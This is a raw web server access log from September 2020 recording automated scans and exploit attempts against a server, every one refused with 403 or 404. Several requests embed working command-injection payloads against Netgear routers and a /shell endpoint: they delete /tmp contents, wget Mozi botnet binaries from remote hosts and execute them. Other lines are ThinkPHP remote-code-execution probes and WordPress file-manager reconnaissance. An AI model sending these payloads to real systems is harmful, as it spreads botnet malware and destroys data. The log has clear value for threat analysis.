192.241.238.10 - - [18/Sep/2020:03:02:52 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 403 125 "-" "Mozilla/5.0 zgrab/0.x"
192.99.14.187 - - [18/Sep/2020:13:50:40 +0900] "GET ///blog///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53"
192.99.14.187 - - [18/Sep/2020:13:52:19 +0900] "GET ///home///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53"
192.99.14.187 - - [18/Sep/2020:13:53:45 +0900] "GET ///old///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
192.99.14.187 - - [18/Sep/2020:13:55:12 +0900] "GET ///demo///wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0"
1.190.229.104 - - [18/Sep/2020:16:13:38 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.190.229.104:37990/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12830 "-" "-"
45.146.164.186 - - [18/Sep/2020:20:13:51 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.186 - - [19/Sep/2020:01:05:51 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 403 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
27.5.17.132 - - [19/Sep/2020:03:31:40 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.5.17.132:51320/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12830 "-" "-"
45.146.164.186 - - [19/Sep/2020:09:02:29 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
124.91.186.237 - - [19/Sep/2020:11:34:48 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://124.91.186.237:32875/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 12830 "-" "Hello, world"
60.243.114.183 - - [19/Sep/2020:14:12:07 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://60.243.114.183:41804/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12830 "-" "-"
162.243.128.11 - - [19/Sep/2020:15:15:52 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 403 125 "-" "Mozilla/5.0 zgrab/0.x"
45.146.164.186 - - [19/Sep/2020:15:52:44 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 403 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.248.172.149 - - [19/Sep/2020:23:07:06 +0900] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 4339 "-" "ZmEu"
202.83.42.64 - - [19/Sep/2020:23:23:47 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12830 "-" "-"
45.146.164.186 - - [20/Sep/2020:02:20:47 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
62.210.146.87 - - [20/Sep/2020:06:47:58 +0900] "GET http://103.213.251.0/2.php HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.210.146.87 - - [20/Sep/2020:06:47:59 +0900] "GET http://103.213.251.0/2.php HTTP/1.1" 404 4339 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36"
89.248.174.11 - - [20/Sep/2020:11:46:55 +0900] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 4339 "-" "ZmEu"
